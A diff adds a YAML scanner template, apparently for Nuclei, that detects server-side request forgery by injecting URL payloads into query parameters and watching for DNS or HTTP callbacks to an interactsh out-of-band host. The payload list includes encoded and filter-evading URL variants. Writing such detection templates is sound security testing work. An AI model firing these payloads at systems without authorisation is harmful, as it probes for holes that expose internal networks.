@@ -1,0 +1,41 @@
+id: query-ssrf-oob-fuzz
+
+info:
+  name: SSRF Out-of-Band Detection - Query Parameter
+  author: NeoPrime
+  severity: medium
+  description: Detects Server-Side Request Forgery (SSRF) vulnerabilities using Out-of-Band (OOB) 
+  tags: ssrf,oob
+
+variables:
+  oob: "{{interactsh-url}}"
+
+http:
+  - payloads:
+      ssrf:
+        low:
+          - "http://{{oob}}"
+          - "https://{{oob}}"
+        
+        medium:
+          - "//{{oob}}"   
+          - "http://{{oob}}%00"
+          - "http://{{oob}}%23"
+        
+        high:
+          - "HTTP://{{oob}}"
+          - "http:%2F%2F{{oob}}"
+    
+    fuzzing:
+      - part: query
+        type: replace
+        mode: multiple
+        fuzz:
+          - "{{ssrf}}"
+    
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
